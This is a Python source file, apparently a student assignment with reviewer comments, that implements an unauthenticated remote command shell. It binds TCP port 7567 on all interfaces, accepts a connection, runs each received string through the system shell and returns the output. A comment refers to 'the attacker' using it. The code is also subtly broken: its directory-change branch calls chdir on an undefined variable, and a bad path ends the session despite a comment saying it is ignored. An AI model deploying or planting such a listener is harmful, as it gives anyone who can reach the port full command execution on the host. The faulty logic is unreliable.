# RemoteCMD.py
#
# Programmer    : Daniel L.
# Personal NO.  : 9127567
# Date          : 25.10.22
# =========================== #
# This program open a socket  on the computer to, recieves cmd commands
# and returns the output.
# =========================== #

"""
* The program is written great but it fails when the attacker wants to change a directory plz fix ♥                [V] Fixed.
* You have an unused constat "IP".                                                                                 [V] It was used.
* Really loved the command line.                                                                                   [V] Thank you.
"""

# Modules
import socket
from os import getcwd, chdir, getlogin
import subprocess as sub
from os.path import isdir

# Constants
PORT        = 7567                          # The port to host the socket on.
BUFFER      = 9999                          # The max size in bytes of the message.
IP          = 0                             # The index of the ip address in the recieved socket info.
COMMAND     = 0                             # The index of the command in the recieved command string.
PATH_JOIN   = "\\"                          # The string sed to join paths.
CD_COMMAND  = "cd"                          # The change directory command.
EXITCOMM    = "exit"                        # The command to excit the cli.
PROMPT      = "\n{}@{} | {} # "             # The format of the cli. username@ip | path #

def main():

    # Create socket and bind it to the local address.
    bind_addr = ('', PORT)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(bind_addr)
    sock.listen()

    # Get the first connection
    conn, addr = sock.accept()
    current_dir = getcwd()

    # Send format string.
    conn.send(PROMPT.format(getlogin() ,addr[IP], current_dir).encode())
    
    # Get the command from the remote connected machine.
    command = conn.recv(BUFFER).decode().strip()

    # Keep processing command until 'exit' command is recieved.
    while command.lower() != EXITCOMM:
        arglist = command.split()
        
        # is the the user wants to change the cwd.
        if (arglist[COMMAND] == CD_COMMAND):

            # Check if only cd was given to print the current path or to change it.
            if (len(arglist) > 1):

                # Change the path, ignore error if the given path is invalid.
                try:
                    chdir(requestedpath)
                except OSError:
                    break
                current_dir = getcwd()
            else:
                conn.send("\n".join([current_dir, ""]).encode())

            # Send a prompt and skip the rest of the loop. this method gives no error message sadly.
            conn.send(PROMPT.format(getlogin() ,addr[IP], current_dir).encode())
            command = conn.recv(BUFFER).decode()
            continue
        
        # Run recieved command in the shell and process output.        
        output = sub.run(command,  capture_output = True, shell = True, cwd = current_dir)
        output = output.stdout if output.stdout else output.stderr
        
        # Send the command output.
        conn.send(output)
        
        # Get the next command.
        conn.send(PROMPT.format(getlogin() ,addr[IP], current_dir).encode())
        command = conn.recv(BUFFER).decode()

    # Close the connection and socket when the exit command is recieved.
    sock.close()
        

if __name__ == "__main__":
    main()
